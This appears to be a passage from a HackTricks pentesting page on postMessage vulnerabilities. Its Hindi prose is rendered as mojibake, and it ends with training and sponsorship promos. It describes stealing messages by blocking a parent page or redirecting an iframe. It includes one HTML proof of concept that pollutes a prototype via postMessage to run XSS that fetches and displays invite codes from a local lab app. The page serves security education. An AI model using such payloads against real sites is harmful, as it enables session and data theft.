### рдореБрдЦреНрдп рдкреГрд╖реНрда рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдХреЗ рдмрдЪреНрдЪреЗ рдХреЛ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢ рдХреЛ рдЪреБрд░рд╛рдирд╛

рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдкреГрд╖реНрда рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рдХреИрд╕реЗ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ postmessage рдбреЗрдЯрд╛** рдХреЛ **рдмрдЪреНрдЪреЗ рдХреЗ iframe** рдореЗрдВ рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдореБрдЦреНрдп** рдкреГрд╖реНрда рдХреЛ рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **рдмреНрд▓реЙрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдмрдЪреНрдЪреЗ рдореЗрдВ XSS** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдХреЛ **рд▓реАрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдП:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe рд╕реНрдерд╛рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рд╕рдВрджреЗрд╢ рдЪреБрд░рд╛рдирд╛

рдпрджрд┐ рдЖрдк рдмрд┐рдирд╛ X-Frame-Header рдХреЗ рдПрдХ рд╡реЗрдмрдкреГрд╖реНрда рдХреЛ iframe рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдФрд░ iframe рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдмрдЪреНрдЪреЗ рдХреЗ iframe рдХрд╛ **рд╕реНрдерд╛рди рдмрджрд▓** рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдпрд╣ рдПрдХ **postmessage** рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ **wildcard** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ iframe рдХрд╛ **рдЙрддреНрдкрддреНрддрд┐** рдПрдХ рдкреГрд╖реНрда рдореЗрдВ **рдмрджрд▓** рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рд╣реИ рдФрд░ рд╕рдВрджреЗрд╢ рдХреЛ **рдЪреБрд░рд╛** рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдФрд░/рдпрд╛ XSS

рдЙрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрд╛ рдЧрдпрд╛ рдбреЗрдЯрд╛ JS рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЖрдк **рдкреГрд╖реНрда** рдХреЛ **iframe** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг/XSS** рдХрд╛ **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдХрд┐ `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рдорд▓реЗ рдХреЛ рднреЗрдЬрддрд╛ рд╣реИред

рдХреБрдЫ **рдмрд╣реБрдд рдЕрдЪреНрдЫреЗ рддрд░реАрдХреЗ рд╕реЗ рд╕рдордЭрд╛рдП рдЧрдП XSS `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) рдореЗрдВ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХ рд╣рдорд▓реЗ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЬреЛ **рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдФрд░ рдлрд┐рд░ XSS** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ `postMessage` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ `iframe` рдореЗрдВ:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
For **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**:

* [**рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг**](../deserialization/nodejs-proto-prototype-pollution/) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреГрд╖реНрда рдХрд╛ рд▓рд┐рдВрдХ
* [**XSS**](../xss-cross-site-scripting/) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреГрд╖реНрда рдХрд╛ рд▓рд┐рдВрдХ
* [**рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреГрд╖реНрда рдХрд╛ рд▓рд┐рдВрдХ

## рд╕рдВрджрд░реНрдн

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* рдЕрднреНрдпрд╛рд╕ рдХреЗ рд▓рд┐рдП: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
